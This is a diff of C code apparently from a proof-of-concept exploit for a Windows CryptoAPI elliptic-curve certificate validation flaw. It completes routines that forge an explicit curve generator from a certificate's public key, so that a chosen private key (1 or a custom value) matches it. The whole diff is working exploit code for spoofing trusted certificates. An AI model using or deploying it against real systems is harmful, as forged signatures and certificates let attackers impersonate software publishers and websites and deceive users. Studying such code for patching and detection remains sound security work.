@@ -71,13 +71,13 @@ bool parseArgs(int argc, char *argv[])
     }
 
     switch (argc - optind) {
-    case 2:
-        inputFile = strdup(argv[optind]);
-        outputFile = strdup(argv[optind + 1]);
-        return true;
     case 1:
         inputFile = strdup(argv[optind]);
         outputFile = strdup(DEFAULT_OUTPUT);
+        return true;
+    case 2:
+        inputFile = strdup(argv[optind]);
+        outputFile = strdup(argv[optind + 1]);
         return true;
     default:
         return false;
@@ -85,12 +85,70 @@ bool parseArgs(int argc, char *argv[])
 }
 
 //
-// Displays an OpenSSL error message after the specified prefix.
+// Displays an OpenSSL error with the specified message prefix.
 //
 void showSslError(const char *prefix)
 {
     printf("[!] Error, %s: ", prefix);
     ERR_print_errors_fp(stdout);
+}
+
+//
+// Prints an OpenSSL BIGNUM to stdout.
+//
+void printBigNum(const BIGNUM* value)
+{
+    char *conv;
+
+    // BN_print_fp() displays in hexidecimal
+    conv = BN_bn2dec(value);
+    if (conv == NULL) {
+        fputs("(null)", stdout);
+    } else {
+        fputs(conv, stdout);
+        OPENSSL_free(conv);
+    }
+}
+
+//
+// Prints an OpenSSL EC_POINT to stdout.
+//
+void printEcPoint(const EC_GROUP *group, const EC_POINT *point)
+{
+    BN_CTX *bnCtx = NULL;
+    BIGNUM *bnX = NULL;
+    BIGNUM *bnY = NULL;
+
+    bnCtx = BN_CTX_new();
+    if (bnCtx == NULL) {
+        showSslError("BN_CTX_new failed");
+        return;
+    }
+    BN_CTX_start(bnCtx);
+
+    bnX = BN_CTX_get(bnCtx);
+    bnY = BN_CTX_get(bnCtx);
+    if (bnX == NULL || bnY == NULL) {
+        showSslError("BN_CTX_get failed");
+        goto cleanUp;
+    }
+
+    if (!EC_POINT_get_affine_coordinates_GFp(group, point, bnX, bnY, bnCtx)) {
+        showSslError("EC_POINT_get_affine_coordinates_GFp failed");
+        goto cleanUp;
+    }
+
+    putchar('(');
+    printBigNum(bnX);
+    putchar(',');
+    printBigNum(bnY);
+    putchar(')');
+
+cleanUp:
+    if (bnCtx != NULL) {
+        BN_CTX_end(bnCtx);
+        BN_CTX_free(bnCtx);
+    }
 }
 
 //
@@ -186,61 +244,68 @@ EC_KEY* getEcPublicKey(X509 *cert)
 //
 // Modifies the EC key using Q=G and d=1.
 //
-bool setEcKeyFixed(EC_KEY *ecKey)
+bool setEcKeyOne(EC_KEY *ecKey)
 {
+    bool result = false;
     EC_GROUP *ecGroup = NULL;
     const EC_GROUP *ecOrigGroup;
-    const EC_POINT *pointGenerator;
+    const EC_POINT *ptGenerator;
+    const EC_POINT *ptPublicKey;
     const BIGNUM *bnOrder;
     const BIGNUM *bnCofactor;
-    const BIGNUM *privateKey;
+    const BIGNUM *bnPrivateKey;
 
     printf("  [-] Duplicating EC key group...\n");
     ecOrigGroup = EC_KEY_get0_group(ecKey);
     if (ecOrigGroup == NULL) {
         showSslError("EC_KEY_get0_group failed");
-        goto error;
+        goto cleanUp;
     }
-    pointGenerator = EC_KEY_get0_public_key(ecKey);
+    ptPublicKey = EC_KEY_get0_public_key(ecKey);
     bnOrder = EC_GROUP_get0_order(ecOrigGroup);
     bnCofactor = EC_GROUP_get0_cofactor(ecOrigGroup);
 
     ecGroup = EC_GROUP_dup(ecOrigGroup);
     if (ecGroup == NULL) {
         showSslError("EC_GROUP_dup failed");
-        goto error;
+        goto cleanUp;
     }
+
+    // d = 1
+    // G = Q
+    bnPrivateKey = BN_value_one();
+    ptGenerator = ptPublicKey;
 
     printf("  [-] Setting EC group to EXPLICIT...\n");
     EC_GROUP_set_asn1_flag(ecGroup, OPENSSL_EC_EXPLICIT_CURVE);
 
     printf("  [-] Setting EC group parameters...\n");
-    if (!EC_GROUP_set_generator(ecGroup, pointGenerator, bnOrder, bnCofactor)) {
+    if (!EC_GROUP_set_generator(ecGroup, ptGenerator, bnOrder, bnCofactor)) {
         showSslError("EC_GROUP_set_generator failed");
-        goto error;
+        goto cleanUp;
     }
 
-    printf("  [-] Setting EC private key to 1...\n");
-    privateKey = BN_value_one();
-    if (!EC_KEY_set_private_key(ecKey, privateKey)) {
+    printf("  [-] Setting EC private key to: 1\n");
+    if (!EC_KEY_set_private_key(ecKey, bnPrivateKey)) {
         showSslError("EC_KEY_set_private_key failed");
-        goto error;
+        goto cleanUp;
     }
 
     printf("  [-] Setting EC key to new group...\n");
     if (!EC_KEY_set_group(ecKey, ecGroup)) {
         showSslError("EC_KEY_set_group failed");
-        goto error;
+        goto cleanUp;
     }
 
-    return true;
+    // Success!
+    result = true;
 
-error:
+cleanUp:
     if (ecGroup != NULL) {
         EC_GROUP_free(ecGroup);
     }
 
-    return false;
+    return result;
 }
 
 //
@@ -249,100 +314,136 @@ error:
 //  d' = specified
 //  G' = d'^-1 * G
 //
-bool setEcKeyCustom(EC_KEY *ecKey)
+bool setEcKeyCustom(EC_KEY *ecKey, const BIGNUM *bnPrivateKey)
 {
+    bool result = false;
     const EC_GROUP *ecOrigGroup;
+    const EC_POINT *ptPublicKey;
     const BIGNUM *bnOrder;
     const BIGNUM *bnCofactor;
+    BN_CTX *bnCtx = NULL;
     BIGNUM *bnA = NULL;
     BIGNUM *bnB = NULL;
     BIGNUM *bnP = NULL;
+    BIGNUM *bnDInv = NULL;
     EC_GROUP *ecGroup = NULL;
-    EC_POINT *ptG = NULL;
+    EC_POINT *ptGenerator = NULL;
 
-    bnA = BN_new();
-    bnB = BN_new();
-    bnP = BN_new();
+    bnCtx = BN_CTX_new();
+    if (bnCtx == NULL) {
+        showSslError("BN_CTX_new failed");
+        return false;
+    }
+    BN_CTX_start(bnCtx);
+
+    bnA = BN_CTX_get(bnCtx);
+    bnB = BN_CTX_get(bnCtx);
+    bnP = BN_CTX_get(bnCtx);
     if (bnA == NULL || bnB == NULL || bnP == NULL) {
-        showSslError("BN_new failed");
-        goto error;
+        showSslError("BN_CTX_get failed");
+        goto cleanUp;
     }
 
     printf("  [-] Retrieving parameters from EC group...\n");
     ecOrigGroup = EC_KEY_get0_group(ecKey);
     if (ecOrigGroup == NULL) {
         showSslError("EC_KEY_get0_group failed");
-        goto error;
+        goto cleanUp;
     }
 
-    if (!EC_GROUP_get_curve(ecOrigGroup, bnP, bnA, bnB, NULL)) {
-        showSslError("EC_GROUP_get_curve failed");
-        goto error;
+    ptPublicKey = EC_KEY_get0_public_key(ecKey);
+
+    if (!EC_GROUP_get_curve_GFp(ecOrigGroup, bnP, bnA, bnB, bnCtx)) {
+        showSslError("EC_GROUP_get_curve_GFp failed");
+        goto cleanUp;
     }
 
     bnOrder = EC_GROUP_get0_order(ecOrigGroup);
     bnCofactor = EC_GROUP_get0_cofactor(ecOrigGroup);
 
     printf("  [-] Creating new EC group over GF(p)...\n");
-    ecGroup = EC_GROUP_new_curve_GFp(bnP, bnA, bnB, NULL);
+    ecGroup = EC_GROUP_new_curve_GFp(bnP, bnA, bnB, bnCtx);
     if (ecGroup == NULL) {
         showSslError("EC_GROUP_new_curve_GFp failed");
-        goto error;
+        goto cleanUp;
     }
 
     EC_GROUP_set_asn1_flag(ecGroup, OPENSSL_EC_EXPLICIT_CURVE);
 
     printf("  [-] Calcuating generator point...\n");
-    ptG = EC_POINT_new(ecGroup);
-    if (ptG == NULL) {
+    ptGenerator = EC_POINT_new(ecGroup);
+    if (ptGenerator == NULL) {
         showSslError("EC_POINT_new failed");
-        goto error;
+        goto cleanUp;
     }
 
-    // TODO:
-    // temp = d^-1
-    // G = d * Q
+    // temp = d^-1 mod Order
+    // G = temp * Q
 
-    // TODO: print G
-    printf("  [-] Setting EC group generator to TODO...\n");
-    if (!EC_GROUP_set_generator(ecGroup, ptG, bnOrder, bnCofactor)) {
+    bnDInv = BN_mod_inverse(NULL, bnPrivateKey, bnOrder, bnCtx);
+    if (bnDInv == NULL) {
+        showSslError("BN_mod_inverse failed");
+        goto cleanUp;
+    }
+
+    if (!EC_POINT_mul(ecGroup, ptGenerator, NULL, ptPublicKey, bnDInv, bnCtx)) {
+        showSslError("EC_POINT_mul failed");
+        goto cleanUp;
+    }
+
+    // TODO: verify point is valid?
+
+    printf("  [-] Setting EC group generator to: ");
+    printEcPoint(ecGroup, ptGenerator);
+    printf("\n");
+
+    if (!EC_GROUP_set_generator(ecGroup, ptGenerator, bnOrder, bnCofactor)) {
         showSslError("EC_GROUP_set_generator failed");
-        goto error;
+        goto cleanUp;
     }
 
-    // TODO: print d
-    printf("  [-] Setting EC private key to TODO...\n");
-    if (!EC_KEY_set_private_key(ecKey, optPrivateKey)) {
+    printf("  [-] Setting EC private key to: ");
+    printBigNum(bnPrivateKey);
+    printf("\n");
+
+    if (!EC_KEY_set_private_key(ecKey, bnPrivateKey)) {
         showSslError("EC_KEY_set_private_key failed");
-        goto error;
+        goto cleanUp;
     }
 
     printf("  [-] Setting EC key to new group...\n");
     if (!EC_KEY_set_group(ecKey, ecGroup)) {
         showSslError("EC_KEY_set_group failed");
-        goto error;
+        goto cleanUp;
     }
 
-    return true;
+    // Success!
+    result = true;
 
-error:
-    if (bnA != NULL) {
-        BN_free(bnA);
-    }
-    if (bnB != NULL) {
-        BN_free(bnB);
-    }
-    if (bnP != NULL) {
-        BN_free(bnP);
-    }
-    if (ptG != NULL) {
-        EC_POINT_free(ptG);
+cleanUp:
+    if (ptGenerator != NULL) {
+        EC_POINT_free(ptGenerator);
     }
     if (ecGroup != NULL) {
         EC_GROUP_free(ecGroup);
     }
+    if (bnCtx != NULL) {
+        BN_CTX_end(bnCtx);
+        BN_CTX_free(bnCtx);
+    }
 
-    return false;
+    return result;
+}
+
+//
+// Modifies the EC key per the CryptoAPI's certificate cache flaw.
+//
+bool modifyEcKey(EC_KEY *ecKey)
+{
+    if (optPrivateKey != NULL) {
+        return setEcKeyCustom(ecKey, optPrivateKey);
+    }
+    return setEcKeyOne(ecKey);
 }
 
 //
@@ -418,12 +519,7 @@ int main(int argc, char *argv[])
     }
 
     printf("[-] Modifying EC key per exploit..\n");
-    if (optPrivateKey != NULL) {
-        if (!setEcKeyCustom(ecKey)) {
-            goto cleanUp;
-        }
-    }
-    else if (!setEcKeyFixed(ecKey)) {
+    if (!modifyEcKey(ecKey)) {
         goto cleanUp;
     }
 
